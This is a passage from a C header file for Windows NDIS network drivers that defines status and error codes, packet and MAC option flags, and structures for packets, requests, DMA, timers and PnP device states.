#define NDIS_STATUS_DOT11_DISASSOCIATION        ((NDIS_STATUS)0x40030008L)
#define NDIS_STATUS_DOT11_TKIPMIC_FAILURE       ((NDIS_STATUS)0x40030009L)
#define NDIS_STATUS_DOT11_PMKID_CANDIDATE_LIST  ((NDIS_STATUS)0x4003000AL)
#define NDIS_STATUS_DOT11_PHY_STATE_CHANGED     ((NDIS_STATUS)0x4003000BL)
#define NDIS_STATUS_DOT11_LINK_QUALITY          ((NDIS_STATUS)0x4003000CL)
#define NDIS_STATUS_DOT11_INCOMING_ASSOC_STARTED ((NDIS_STATUS)0x4003000DL)
#define NDIS_STATUS_DOT11_INCOMING_ASSOC_REQUEST_RECEIVED ((NDIS_STATUS)0x4003000EL)
#define NDIS_STATUS_DOT11_INCOMING_ASSOC_COMPLETION ((NDIS_STATUS)0x4003000FL)
#define NDIS_STATUS_DOT11_STOP_AP               ((NDIS_STATUS)0x40030010L)
#define NDIS_STATUS_DOT11_PHY_FREQUENCY_ADOPTED ((NDIS_STATUS)0x40030011L)
#define NDIS_STATUS_DOT11_CAN_SUSTAIN_AP        ((NDIS_STATUS)0x40030012L)

#define NDIS_STATUS_WWAN_DEVICE_CAPS            ((NDIS_STATUS)0x40041000)
#define NDIS_STATUS_WWAN_READY_INFO             ((NDIS_STATUS)0x40041001)
#define NDIS_STATUS_WWAN_RADIO_STATE            ((NDIS_STATUS)0x40041002)
#define NDIS_STATUS_WWAN_PIN_INFO               ((NDIS_STATUS)0x40041003)
#define NDIS_STATUS_WWAN_PIN_LIST               ((NDIS_STATUS)0x40041004)
#define NDIS_STATUS_WWAN_HOME_PROVIDER          ((NDIS_STATUS)0x40041005)
#define NDIS_STATUS_WWAN_PREFERRED_PROVIDERS    ((NDIS_STATUS)0x40041006)
#define NDIS_STATUS_WWAN_VISIBLE_PROVIDERS      ((NDIS_STATUS)0x40041007)
#define NDIS_STATUS_WWAN_REGISTER_STATE         ((NDIS_STATUS)0x40041008)
#define NDIS_STATUS_WWAN_PACKET_SERVICE         ((NDIS_STATUS)0x40041009)
#define NDIS_STATUS_WWAN_SIGNAL_STATE           ((NDIS_STATUS)0x4004100a)
#define NDIS_STATUS_WWAN_CONTEXT_STATE          ((NDIS_STATUS)0x4004100b)
#define NDIS_STATUS_WWAN_PROVISIONED_CONTEXTS   ((NDIS_STATUS)0x4004100c)
#define NDIS_STATUS_WWAN_SERVICE_ACTIVATION     ((NDIS_STATUS)0x4004100d)
#define NDIS_STATUS_WWAN_SMS_CONFIGURATION      ((NDIS_STATUS)0x4004100e)
#define NDIS_STATUS_WWAN_SMS_RECEIVE            ((NDIS_STATUS)0x4004100f)
#define NDIS_STATUS_WWAN_SMS_SEND               ((NDIS_STATUS)0x40041010)
#define NDIS_STATUS_WWAN_SMS_DELETE             ((NDIS_STATUS)0x40041011)
#define NDIS_STATUS_WWAN_SMS_STATUS             ((NDIS_STATUS)0x40041012)
#define NDIS_STATUS_WWAN_DNS_ADDRESS            ((NDIS_STATUS)0x40041013)

#define NDIS_STATUS_WWAN_VENDOR_SPECIFIC        ((NDIS_STATUS)0x40043000)

#endif /* NDIS_SUPPORT_NDIS6 */

#if (NDIS_SUPPORT_NDIS620)
#define NDIS_STATUS_PM_WOL_PATTERN_REJECTED     ((NDIS_STATUS)0x40030051L)
#define NDIS_STATUS_PM_OFFLOAD_REJECTED         ((NDIS_STATUS)0x40030052L)
#define NDIS_STATUS_PM_CAPABILITIES_CHANGE      ((NDIS_STATUS)0x40030053L)
#endif

#define NDIS_STATUS_NOT_RESETTABLE              ((NDIS_STATUS)0x80010001L)
#define NDIS_STATUS_SOFT_ERRORS                 ((NDIS_STATUS)0x80010003L)
#define NDIS_STATUS_HARD_ERRORS                 ((NDIS_STATUS)0x80010004L)
#define NDIS_STATUS_BUFFER_OVERFLOW             ((NDIS_STATUS)STATUS_BUFFER_OVERFLOW)
#define NDIS_STATUS_FAILURE                     ((NDIS_STATUS)STATUS_UNSUCCESSFUL)
#define NDIS_STATUS_RESOURCES                   ((NDIS_STATUS)STATUS_INSUFFICIENT_RESOURCES)
#define NDIS_STATUS_CLOSING                     ((NDIS_STATUS)0xC0010002L)
#define NDIS_STATUS_BAD_VERSION                 ((NDIS_STATUS)0xC0010004L)
#define NDIS_STATUS_BAD_CHARACTERISTICS         ((NDIS_STATUS)0xC0010005L)
#define NDIS_STATUS_ADAPTER_NOT_FOUND           ((NDIS_STATUS)0xC0010006L)
#define NDIS_STATUS_OPEN_FAILED                 ((NDIS_STATUS)0xC0010007L)
#define NDIS_STATUS_DEVICE_FAILED               ((NDIS_STATUS)0xC0010008L)
#define NDIS_STATUS_MULTICAST_FULL              ((NDIS_STATUS)0xC0010009L)
#define NDIS_STATUS_MULTICAST_EXISTS            ((NDIS_STATUS)0xC001000AL)
#define NDIS_STATUS_MULTICAST_NOT_FOUND         ((NDIS_STATUS)0xC001000BL)
#define NDIS_STATUS_REQUEST_ABORTED             ((NDIS_STATUS)0xC001000CL)
#define NDIS_STATUS_RESET_IN_PROGRESS           ((NDIS_STATUS)0xC001000DL)
#define NDIS_STATUS_CLOSING_INDICATING          ((NDIS_STATUS)0xC001000EL)
#define NDIS_STATUS_NOT_SUPPORTED               ((NDIS_STATUS)STATUS_NOT_SUPPORTED)
#define NDIS_STATUS_INVALID_PACKET              ((NDIS_STATUS)0xC001000FL)
#define NDIS_STATUS_OPEN_LIST_FULL              ((NDIS_STATUS)0xC0010010L)
#define NDIS_STATUS_ADAPTER_NOT_READY           ((NDIS_STATUS)0xC0010011L)
#define NDIS_STATUS_ADAPTER_NOT_OPEN            ((NDIS_STATUS)0xC0010012L)
#define NDIS_STATUS_NOT_INDICATING              ((NDIS_STATUS)0xC0010013L)
#define NDIS_STATUS_INVALID_LENGTH              ((NDIS_STATUS)0xC0010014L)
#define NDIS_STATUS_INVALID_DATA                ((NDIS_STATUS)0xC0010015L)
#define NDIS_STATUS_BUFFER_TOO_SHORT            ((NDIS_STATUS)0xC0010016L)
#define NDIS_STATUS_INVALID_OID                 ((NDIS_STATUS)0xC0010017L)
#define NDIS_STATUS_ADAPTER_REMOVED             ((NDIS_STATUS)0xC0010018L)
#define NDIS_STATUS_UNSUPPORTED_MEDIA           ((NDIS_STATUS)0xC0010019L)
#define NDIS_STATUS_GROUP_ADDRESS_IN_USE        ((NDIS_STATUS)0xC001001AL)
#define NDIS_STATUS_FILE_NOT_FOUND              ((NDIS_STATUS)0xC001001BL)
#define NDIS_STATUS_ERROR_READING_FILE          ((NDIS_STATUS)0xC001001CL)
#define NDIS_STATUS_ALREADY_MAPPED              ((NDIS_STATUS)0xC001001DL)
#define NDIS_STATUS_RESOURCE_CONFLICT           ((NDIS_STATUS)0xC001001EL)
#define NDIS_STATUS_NO_CABLE                    ((NDIS_STATUS)0xC001001FL)

#define NDIS_STATUS_INVALID_SAP                 ((NDIS_STATUS)0xC0010020L)
#define NDIS_STATUS_SAP_IN_USE                  ((NDIS_STATUS)0xC0010021L)
#define NDIS_STATUS_INVALID_ADDRESS             ((NDIS_STATUS)0xC0010022L)
#define NDIS_STATUS_VC_NOT_ACTIVATED            ((NDIS_STATUS)0xC0010023L)
#define NDIS_STATUS_DEST_OUT_OF_ORDER           ((NDIS_STATUS)0xC0010024L)
#define NDIS_STATUS_VC_NOT_AVAILABLE            ((NDIS_STATUS)0xC0010025L)
#define NDIS_STATUS_CELLRATE_NOT_AVAILABLE      ((NDIS_STATUS)0xC0010026L)
#define NDIS_STATUS_INCOMPATABLE_QOS            ((NDIS_STATUS)0xC0010027L)
#define NDIS_STATUS_AAL_PARAMS_UNSUPPORTED      ((NDIS_STATUS)0xC0010028L)
#define NDIS_STATUS_NO_ROUTE_TO_DESTINATION     ((NDIS_STATUS)0xC0010029L)

#define NDIS_STATUS_TOKEN_RING_OPEN_ERROR       ((NDIS_STATUS)0xC0011000L)
#define NDIS_STATUS_INVALID_DEVICE_REQUEST      ((NDIS_STATUS)STATUS_INVALID_DEVICE_REQUEST)
#define NDIS_STATUS_NETWORK_UNREACHABLE         ((NDIS_STATUS)STATUS_NETWORK_UNREACHABLE)

#if NDIS_SUPPORT_NDIS6

#define NDIS_STATUS_SEND_ABORTED                ((NDIS_STATUS)STATUS_NDIS_REQUEST_ABORTED)
#define NDIS_STATUS_PAUSED                      ((NDIS_STATUS)STATUS_NDIS_PAUSED)
#define NDIS_STATUS_INTERFACE_NOT_FOUND         ((NDIS_STATUS)STATUS_NDIS_INTERFACE_NOT_FOUND)
#define NDIS_STATUS_INVALID_PARAMETER           ((NDIS_STATUS)STATUS_INVALID_PARAMETER)
#define NDIS_STATUS_UNSUPPORTED_REVISION        ((NDIS_STATUS)STATUS_NDIS_UNSUPPORTED_REVISION)
#define NDIS_STATUS_INVALID_PORT                ((NDIS_STATUS)STATUS_NDIS_INVALID_PORT)
#define NDIS_STATUS_INVALID_PORT_STATE          ((NDIS_STATUS)STATUS_NDIS_INVALID_PORT_STATE)
#define NDIS_STATUS_INVALID_STATE               ((NDIS_STATUS)STATUS_INVALID_DEVICE_STATE)
#define NDIS_STATUS_MEDIA_DISCONNECTED          ((NDIS_STATUS)STATUS_NDIS_MEDIA_DISCONNECTED)
#define NDIS_STATUS_LOW_POWER_STATE             ((NDIS_STATUS)STATUS_NDIS_LOW_POWER_STATE)
#define NDIS_STATUS_DOT11_AUTO_CONFIG_ENABLED   ((NDIS_STATUS)STATUS_NDIS_DOT11_AUTO_CONFIG_ENABLED)
#define NDIS_STATUS_DOT11_MEDIA_IN_USE          ((NDIS_STATUS)STATUS_NDIS_DOT11_MEDIA_IN_USE)
#define NDIS_STATUS_DOT11_POWER_STATE_INVALID   ((NDIS_STATUS)STATUS_NDIS_DOT11_POWER_STATE_INVALID)
#define NDIS_STATUS_UPLOAD_IN_PROGRESS          ((NDIS_STATUS)0xC0231001L)
#define NDIS_STATUS_REQUEST_UPLOAD              ((NDIS_STATUS)0xC0231002L)
#define NDIS_STATUS_UPLOAD_REQUESTED            ((NDIS_STATUS)0xC0231003L)
#define NDIS_STATUS_OFFLOAD_TCP_ENTRIES         ((NDIS_STATUS)0xC0231004L)
#define NDIS_STATUS_OFFLOAD_PATH_ENTRIES        ((NDIS_STATUS)0xC0231005L)
#define NDIS_STATUS_OFFLOAD_NEIGHBOR_ENTRIES    ((NDIS_STATUS)0xC0231006L)
#define NDIS_STATUS_OFFLOAD_IP_ADDRESS_ENTRIES  ((NDIS_STATUS)0xC0231007L)
#define NDIS_STATUS_OFFLOAD_HW_ADDRESS_ENTRIES  ((NDIS_STATUS)0xC0231008L)
#define NDIS_STATUS_OFFLOAD_VLAN_ENTRIES        ((NDIS_STATUS)0xC0231009L)
#define NDIS_STATUS_OFFLOAD_TCP_XMIT_BUFFER     ((NDIS_STATUS)0xC023100AL)
#define NDIS_STATUS_OFFLOAD_TCP_RCV_BUFFER      ((NDIS_STATUS)0xC023100BL)
#define NDIS_STATUS_OFFLOAD_TCP_RCV_WINDOW      ((NDIS_STATUS)0xC023100CL)
#define NDIS_STATUS_OFFLOAD_VLAN_MISMATCH       ((NDIS_STATUS)0xC023100DL)
#define NDIS_STATUS_OFFLOAD_DATA_NOT_ACCEPTED   ((NDIS_STATUS)0xC023100EL)
#define NDIS_STATUS_OFFLOAD_POLICY              ((NDIS_STATUS)0xC023100FL)
#define NDIS_STATUS_OFFLOAD_DATA_PARTIALLY_ACCEPTED ((NDIS_STATUS)0xC0231010L)
#define NDIS_STATUS_OFFLOAD_REQUEST_RESET       ((NDIS_STATUS)0xC0231011L)

#if NDIS_SUPPORT_NDIS620
#define NDIS_STATUS_PM_WOL_PATTERN_LIST_FULL    ((NDIS_STATUS)STATUS_NDIS_PM_WOL_PATTERN_LIST_FULL)
#define NDIS_STATUS_PM_PROTOCOL_OFFLOAD_LIST_FULL ((NDIS_STATUS)STATUS_NDIS_PM_PROTOCOL_OFFLOAD_LIST_FULL)
#endif

#endif /* NDIS_SUPPORT_NDIS6 */

#if (NDIS_SUPPORT_NDIS620)
#define NDIS_STATUS_OFFLOAD_CONNECTION_REJECTED ((NDIS_STATUS)STATUS_NDIS_OFFLOAD_CONNECTION_REJECTED)
#endif

/* NDIS error codes for error logging */

#define NDIS_ERROR_CODE ULONG

#define NDIS_ERROR_CODE_RESOURCE_CONFLICT               EVENT_NDIS_RESOURCE_CONFLICT
#define NDIS_ERROR_CODE_OUT_OF_RESOURCES                EVENT_NDIS_OUT_OF_RESOURCE
#define NDIS_ERROR_CODE_HARDWARE_FAILURE                EVENT_NDIS_HARDWARE_FAILURE
#define NDIS_ERROR_CODE_ADAPTER_NOT_FOUND               EVENT_NDIS_ADAPTER_NOT_FOUND
#define NDIS_ERROR_CODE_INTERRUPT_CONNECT               EVENT_NDIS_INTERRUPT_CONNECT
#define NDIS_ERROR_CODE_DRIVER_FAILURE                  EVENT_NDIS_DRIVER_FAILURE
#define NDIS_ERROR_CODE_BAD_VERSION                     EVENT_NDIS_BAD_VERSION
#define NDIS_ERROR_CODE_TIMEOUT                         EVENT_NDIS_TIMEOUT
#define NDIS_ERROR_CODE_NETWORK_ADDRESS                 EVENT_NDIS_NETWORK_ADDRESS
#define NDIS_ERROR_CODE_UNSUPPORTED_CONFIGURATION       EVENT_NDIS_UNSUPPORTED_CONFIGURATION
#define NDIS_ERROR_CODE_INVALID_VALUE_FROM_ADAPTER      EVENT_NDIS_INVALID_VALUE_FROM_ADAPTER
#define NDIS_ERROR_CODE_MISSING_CONFIGURATION_PARAMETER EVENT_NDIS_MISSING_CONFIGURATION_PARAMETER
#define NDIS_ERROR_CODE_BAD_IO_BASE_ADDRESS             EVENT_NDIS_BAD_IO_BASE_ADDRESS
#define NDIS_ERROR_CODE_RECEIVE_SPACE_SMALL             EVENT_NDIS_RECEIVE_SPACE_SMALL
#define NDIS_ERROR_CODE_ADAPTER_DISABLED                EVENT_NDIS_ADAPTER_DISABLED

/* Memory allocation flags. Used by Ndis[Allocate|Free]Memory */
#define NDIS_MEMORY_CONTIGUOUS            0x00000001
#define NDIS_MEMORY_NONCACHED             0x00000002

/* NIC attribute flags. Used by NdisMSetAttributes(Ex) */
#define	NDIS_ATTRIBUTE_IGNORE_PACKET_TIMEOUT    0x00000001
#define NDIS_ATTRIBUTE_IGNORE_REQUEST_TIMEOUT   0x00000002
#define NDIS_ATTRIBUTE_IGNORE_TOKEN_RING_ERRORS 0x00000004
#define NDIS_ATTRIBUTE_BUS_MASTER               0x00000008
#define NDIS_ATTRIBUTE_INTERMEDIATE_DRIVER      0x00000010
#define NDIS_ATTRIBUTE_DESERIALIZE              0x00000020
#define NDIS_ATTRIBUTE_NO_HALT_ON_SUSPEND       0x00000040
#define NDIS_ATTRIBUTE_SURPRISE_REMOVE_OK       0x00000080
#define NDIS_ATTRIBUTE_NOT_CO_NDIS              0x00000100
#define NDIS_ATTRIBUTE_USES_SAFE_BUFFER_APIS    0x00000200

/* Lock */

#if NDIS_SUPPORT_60_COMPATIBLE_API

typedef union _NDIS_RW_LOCK_REFCOUNT {
  UINT RefCount;
  UCHAR cacheLine[16];
} NDIS_RW_LOCK_REFCOUNT;

typedef struct _NDIS_RW_LOCK {
  __MINGW_EXTENSION union {
    __MINGW_EXTENSION struct {
      KSPIN_LOCK SpinLock;
      PVOID Context;
    };
    UCHAR Reserved[16];
  };
  __MINGW_EXTENSION union {
    NDIS_RW_LOCK_REFCOUNT RefCount[MAXIMUM_PROCESSORS]; 
    ULONG RefCountEx[sizeof(NDIS_RW_LOCK_REFCOUNT)/sizeof(ULONG) * MAXIMUM_PROCESSORS];
    __MINGW_EXTENSION struct {
      KSPIN_LOCK RefCountLock;
      volatile ULONG SharedRefCount;
      volatile BOOLEAN WriterWaiting;
    };
  };
} NDIS_RW_LOCK, *PNDIS_RW_LOCK;

typedef struct _LOCK_STATE {
  USHORT LockState;
  KIRQL OldIrql;
} LOCK_STATE, *PLOCK_STATE;

#endif /* NDIS_SUPPORT_60_COMPATIBLE_API */

/* Timer */

typedef VOID
(NTAPI NDIS_TIMER_FUNCTION)(
  IN PVOID SystemSpecific1,
  IN PVOID FunctionContext,
  IN PVOID SystemSpecific2,
  IN PVOID SystemSpecific3);
typedef NDIS_TIMER_FUNCTION *PNDIS_TIMER_FUNCTION;

typedef struct _NDIS_TIMER {
  KTIMER Timer;
  KDPC Dpc;
} NDIS_TIMER, *PNDIS_TIMER;

/* Hardware */

typedef CM_MCA_POS_DATA NDIS_MCA_POS_DATA, *PNDIS_MCA_POS_DATA;
typedef CM_EISA_SLOT_INFORMATION NDIS_EISA_SLOT_INFORMATION, *PNDIS_EISA_SLOT_INFORMATION;
typedef CM_EISA_FUNCTION_INFORMATION NDIS_EISA_FUNCTION_INFORMATION, *PNDIS_EISA_FUNCTION_INFORMATION;
typedef CM_PARTIAL_RESOURCE_LIST NDIS_RESOURCE_LIST, *PNDIS_RESOURCE_LIST;

/* Flag bits */
#define	READABLE_LOCAL_CLOCK                    0x00000001
#define	CLOCK_NETWORK_DERIVED                   0x00000002
#define	CLOCK_PRECISION                         0x00000004
#define	RECEIVE_TIME_INDICATION_CAPABLE         0x00000008
#define	TIMED_SEND_CAPABLE                      0x00000010
#define	TIME_STAMP_CAPABLE                      0x00000020

/* NDIS packet filter bits (OID_GEN_CURRENT_PACKET_FILTER) */
#define NDIS_PACKET_TYPE_DIRECTED               0x00000001
#define NDIS_PACKET_TYPE_MULTICAST              0x00000002
#define NDIS_PACKET_TYPE_ALL_MULTICAST          0x00000004
#define NDIS_PACKET_TYPE_BROADCAST              0x00000008
#define NDIS_PACKET_TYPE_SOURCE_ROUTING         0x00000010
#define NDIS_PACKET_TYPE_PROMISCUOUS            0x00000020
#define NDIS_PACKET_TYPE_SMT                    0x00000040
#define NDIS_PACKET_TYPE_ALL_LOCAL              0x00000080
#define NDIS_PACKET_TYPE_GROUP                  0x00001000
#define NDIS_PACKET_TYPE_ALL_FUNCTIONAL         0x00002000
#define NDIS_PACKET_TYPE_FUNCTIONAL             0x00004000
#define NDIS_PACKET_TYPE_MAC_FRAME              0x00008000

/* NDIS protocol option bits (OID_GEN_PROTOCOL_OPTIONS) */
#define NDIS_PROT_OPTION_ESTIMATED_LENGTH       0x00000001
#define NDIS_PROT_OPTION_NO_LOOPBACK            0x00000002
#define NDIS_PROT_OPTION_NO_RSVD_ON_RCVPKT      0x00000004

/* NDIS MAC option bits (OID_GEN_MAC_OPTIONS) */
#define NDIS_MAC_OPTION_COPY_LOOKAHEAD_DATA     0x00000001
#define NDIS_MAC_OPTION_RECEIVE_SERIALIZED      0x00000002
#define NDIS_MAC_OPTION_TRANSFERS_NOT_PEND      0x00000004
#define NDIS_MAC_OPTION_NO_LOOPBACK             0x00000008
#define NDIS_MAC_OPTION_FULL_DUPLEX             0x00000010
#define	NDIS_MAC_OPTION_EOTX_INDICATION         0x00000020
#define	NDIS_MAC_OPTION_8021P_PRIORITY          0x00000040
#define NDIS_MAC_OPTION_RESERVED                0x80000000

#define	NDIS_GUID_TO_OID                  0x00000001
#define	NDIS_GUID_TO_STATUS               0x00000002
#define	NDIS_GUID_ANSI_STRING             0x00000004
#define	NDIS_GUID_UNICODE_STRING          0x00000008
#define	NDIS_GUID_ARRAY                   0x00000010

#if NDIS_LEGACY_DRIVER

/* NDIS_PACKET_PRIVATE.Flags constants */
#define fPACKET_WRAPPER_RESERVED             0x3f
#define fPACKET_CONTAINS_MEDIA_SPECIFIC_INFO 0x40
#define fPACKET_ALLOCATED_BY_NDIS            0x80

#define NDIS_FLAGS_PROTOCOL_ID_MASK          0x0000000f
#define NDIS_FLAGS_MULTICAST_PACKET          0x00000010
#define NDIS_FLAGS_RESERVED2                 0x00000020
#define NDIS_FLAGS_RESERVED3                 0x00000040
#define NDIS_FLAGS_DONT_LOOPBACK             0x00000080
#define NDIS_FLAGS_IS_LOOPBACK_PACKET        0x00000100
#define NDIS_FLAGS_LOOPBACK_ONLY             0x00000200
#define NDIS_FLAGS_RESERVED4                 0x00000400
#define NDIS_FLAGS_DOUBLE_BUFFERED           0x00000800
#define NDIS_FLAGS_SENT_AT_DPC               0x00001000
#define NDIS_FLAGS_USES_SG_BUFFER_LIST       0x00002000
#define NDIS_FLAGS_USES_ORIGINAL_PACKET      0x00004000
#define NDIS_FLAGS_PADDED                    0x00010000
#define NDIS_FLAGS_XLATE_AT_TOP              0x00020000

typedef NDIS_HANDLE PNDIS_PACKET_POOL;

typedef struct _NDIS_PACKET_PRIVATE {
  UINT PhysicalCount;
  UINT TotalLength;
  PNDIS_BUFFER Head;
  PNDIS_BUFFER Tail;
  PNDIS_PACKET_POOL Pool;
  UINT Count;
  ULONG Flags;
  BOOLEAN ValidCounts;
  UCHAR NdisPacketFlags;
  USHORT NdisPacketOobOffset;
} NDIS_PACKET_PRIVATE, *PNDIS_PACKET_PRIVATE;

typedef struct _NDIS_PACKET {
  NDIS_PACKET_PRIVATE Private;
  __MINGW_EXTENSION union {
    __MINGW_EXTENSION struct {
      UCHAR MiniportReserved[2 * sizeof(PVOID)];
      UCHAR WrapperReserved[2 * sizeof(PVOID)];
    };
    __MINGW_EXTENSION struct {
      UCHAR MiniportReservedEx[3 * sizeof(PVOID)];
      UCHAR WrapperReservedEx[sizeof(PVOID)];
    };
    __MINGW_EXTENSION struct {
      UCHAR MacReserved[4 * sizeof(PVOID)];
    };
  };
  ULONG_PTR Reserved[2];
  UCHAR ProtocolReserved[1];
} NDIS_PACKET, *PNDIS_PACKET, **PPNDIS_PACKET;

typedef struct _NDIS_PACKET_STACK {
  ULONG_PTR IMReserved[2];
  ULONG_PTR NdisReserved[4];
} NDIS_PACKET_STACK, *PNDIS_PACKET_STACK;

#endif /* NDIS_LEGACY_DRIVER */

typedef enum _NDIS_CLASS_ID {
  NdisClass802_3Priority,
  NdisClassWirelessWanMbxMailbox,
  NdisClassIrdaPacketInfo,
  NdisClassAtmAALInfo
} NDIS_CLASS_ID;

typedef struct _MEDIA_SPECIFIC_INFORMATION {
  UINT NextEntryOffset;
  NDIS_CLASS_ID ClassId;
  UINT Size;
  UCHAR ClassInformation[1];
} MEDIA_SPECIFIC_INFORMATION, *PMEDIA_SPECIFIC_INFORMATION;

#if NDIS_LEGACY_DRIVER
typedef struct _NDIS_PACKET_OOB_DATA {
  __MINGW_EXTENSION union {
    ULONGLONG TimeToSend;
    ULONGLONG TimeSent;
  };
  ULONGLONG TimeReceived;
  UINT HeaderSize;
  UINT SizeMediaSpecificInfo;
  PVOID MediaSpecificInformation;
  NDIS_STATUS Status;
} NDIS_PACKET_OOB_DATA, *PNDIS_PACKET_OOB_DATA;
#endif

/* Request types used by NdisRequest */
typedef enum _NDIS_REQUEST_TYPE {
  NdisRequestQueryInformation,
  NdisRequestSetInformation,
  NdisRequestQueryStatistics,
  NdisRequestOpen,
  NdisRequestClose,
  NdisRequestSend,
  NdisRequestTransferData,
  NdisRequestReset,
  NdisRequestGeneric1,
  NdisRequestGeneric2,
  NdisRequestGeneric3,
  NdisRequestGeneric4,
#if NDIS_SUPPORT_NDIS6
  NdisRequestMethod,
#endif
} NDIS_REQUEST_TYPE, *PNDIS_REQUEST_TYPE;

#if NDIS_LEGACY_DRIVER
typedef struct _NDIS_REQUEST {
  UCHAR MacReserved[4 * sizeof(PVOID)];
  NDIS_REQUEST_TYPE RequestType;
  union _DATA {
    struct QUERY_INFORMATION {
      NDIS_OID Oid;
      PVOID InformationBuffer;
      UINT InformationBufferLength;
      UINT BytesWritten;
      UINT BytesNeeded;
    } QUERY_INFORMATION;
    struct SET_INFORMATION {
      NDIS_OID Oid;
      PVOID InformationBuffer;
      UINT InformationBufferLength;
      UINT BytesRead;
      UINT BytesNeeded;
    } SET_INFORMATION;
 } DATA;
#if (defined(NDIS50) || defined(NDIS51) || defined(NDIS50_MINIPORT) || defined(NDIS51_MINIPORT))
  UCHAR NdisReserved[9 * sizeof(PVOID)];
  __MINGW_EXTENSION union {
    UCHAR CallMgrReserved[2 * sizeof(PVOID)];
    UCHAR ProtocolReserved[2 * sizeof(PVOID)];
  };
  UCHAR MiniportReserved[2 * sizeof(PVOID)];
#endif
} NDIS_REQUEST, *PNDIS_REQUEST;
#endif /* NDIS_LEGACY_DRIVER */

/* Wide Area Networks definitions */

#if NDIS_LEGACY_DRIVER
typedef struct _NDIS_WAN_PACKET {
  LIST_ENTRY WanPacketQueue;
  PUCHAR CurrentBuffer;
  ULONG CurrentLength;
  PUCHAR StartBuffer;
  PUCHAR EndBuffer;
  PVOID ProtocolReserved1;
  PVOID ProtocolReserved2;
  PVOID ProtocolReserved3;
  PVOID ProtocolReserved4;
  PVOID MacReserved1;
  PVOID MacReserved2;
  PVOID MacReserved3;
  PVOID MacReserved4;
} NDIS_WAN_PACKET, *PNDIS_WAN_PACKET;
#endif

/* DMA channel information */

typedef struct _NDIS_DMA_DESCRIPTION {
  BOOLEAN  DemandMode;
  BOOLEAN  AutoInitialize;
  BOOLEAN  DmaChannelSpecified;
  DMA_WIDTH  DmaWidth;
  DMA_SPEED  DmaSpeed;
  ULONG  DmaPort;
  ULONG  DmaChannel;
} NDIS_DMA_DESCRIPTION, *PNDIS_DMA_DESCRIPTION;

typedef struct _NDIS_DMA_BLOCK {
  PVOID  MapRegisterBase;
  KEVENT  AllocationEvent;
  PADAPTER_OBJECT  SystemAdapterObject;
  PVOID  Miniport;
  BOOLEAN  InProgress;
} NDIS_DMA_BLOCK, *PNDIS_DMA_BLOCK;

typedef UCHAR NDIS_DMA_SIZE;

#define NDIS_DMA_24BITS                         ((NDIS_DMA_SIZE)0)
#define NDIS_DMA_32BITS                         ((NDIS_DMA_SIZE)1)
#define NDIS_DMA_64BITS                         ((NDIS_DMA_SIZE)2)

typedef enum _NDIS_PROCESSOR_TYPE {
  NdisProcessorX86,
  NdisProcessorMips,
  NdisProcessorAlpha,
  NdisProcessorPpc,
  NdisProcessorAmd64,
  NdisProcessorIA64
} NDIS_PROCESSOR_TYPE, *PNDIS_PROCESSOR_TYPE;

typedef enum _NDIS_ENVIRONMENT_TYPE {
  NdisEnvironmentWindows,
  NdisEnvironmentWindowsNt
} NDIS_ENVIRONMENT_TYPE, *PNDIS_ENVIRONMENT_TYPE;

/* Possible hardware architecture */
typedef enum _NDIS_INTERFACE_TYPE {
  NdisInterfaceInternal = Internal,
  NdisInterfaceIsa = Isa,
  NdisInterfaceEisa = Eisa,
  NdisInterfaceMca = MicroChannel,
  NdisInterfaceTurboChannel = TurboChannel,
  NdisInterfacePci = PCIBus,
  NdisInterfacePcMcia = PCMCIABus,
  NdisInterfaceCBus = CBus,
  NdisInterfaceMPIBus = MPIBus,
  NdisInterfaceMPSABus = MPSABus,
  NdisInterfaceProcessorInternal = ProcessorInternal,
  NdisInterfaceInternalPowerBus = InternalPowerBus,
  NdisInterfacePNPISABus = PNPISABus,
  NdisInterfacePNPBus = PNPBus,
  NdisInterfaceUSB,
  NdisInterfaceIrda,
  NdisInterface1394,
  NdisMaximumInterfaceType
} NDIS_INTERFACE_TYPE, *PNDIS_INTERFACE_TYPE;

#define NdisInterruptLevelSensitive       LevelSensitive
#define NdisInterruptLatched              Latched

typedef KINTERRUPT_MODE NDIS_INTERRUPT_MODE, *PNDIS_INTERRUPT_MODE;

typedef enum _NDIS_PARAMETER_TYPE {
  NdisParameterInteger,
  NdisParameterHexInteger,
  NdisParameterString,
  NdisParameterMultiString,
  NdisParameterBinary
} NDIS_PARAMETER_TYPE, *PNDIS_PARAMETER_TYPE;

typedef struct _BINARY_DATA {
  USHORT Length;
  PVOID Buffer;
} BINARY_DATA;

typedef struct _NDIS_CONFIGURATION_PARAMETER {
  NDIS_PARAMETER_TYPE ParameterType;
  union {
    ULONG IntegerData;
    NDIS_STRING StringData;
    BINARY_DATA BinaryData;
  } ParameterData;
} NDIS_CONFIGURATION_PARAMETER, *PNDIS_CONFIGURATION_PARAMETER;

typedef PHYSICAL_ADDRESS NDIS_PHYSICAL_ADDRESS, *PNDIS_PHYSICAL_ADDRESS;

typedef struct _NDIS_PHYSICAL_ADDRESS_UNIT {
  NDIS_PHYSICAL_ADDRESS PhysicalAddress;
  UINT Length;
} NDIS_PHYSICAL_ADDRESS_UNIT, *PNDIS_PHYSICAL_ADDRESS_UNIT;

typedef struct _NDIS_WAN_LINE_DOWN {
  UCHAR RemoteAddress[6];
  UCHAR LocalAddress[6];
} NDIS_WAN_LINE_DOWN, *PNDIS_WAN_LINE_DOWN;

typedef struct _NDIS_WAN_LINE_UP {
  ULONG LinkSpeed;
  ULONG MaximumTotalSize;
  NDIS_WAN_QUALITY Quality;
  USHORT SendWindow;
  UCHAR RemoteAddress[6];
  OUT UCHAR LocalAddress[6];
  ULONG ProtocolBufferLength;
  PUCHAR ProtocolBuffer;
  USHORT ProtocolType;
  NDIS_STRING DeviceName;
} NDIS_WAN_LINE_UP, *PNDIS_WAN_LINE_UP;

typedef NTSTATUS
(NTAPI *TDI_REGISTER_CALLBACK)(
  IN PUNICODE_STRING DeviceName,
  OUT HANDLE *TdiHandle);

typedef NTSTATUS
(NTAPI *TDI_PNP_HANDLER)(
  IN PUNICODE_STRING UpperComponent,
  IN PUNICODE_STRING LowerComponent,
  IN PUNICODE_STRING BindList,
  IN PVOID ReconfigBuffer,
  IN UINT ReconfigBufferSize,
  IN UINT Operation);

typedef struct _OID_LIST    OID_LIST, *POID_LIST;

/* PnP state */

typedef enum _NDIS_PNP_DEVICE_STATE {
  NdisPnPDeviceAdded,
  NdisPnPDeviceStarted,
  NdisPnPDeviceQueryStopped,
  NdisPnPDeviceStopped,
  NdisPnPDeviceQueryRemoved,
  NdisPnPDeviceRemoved,
  NdisPnPDeviceSurpriseRemoved
} NDIS_PNP_DEVICE_STATE;

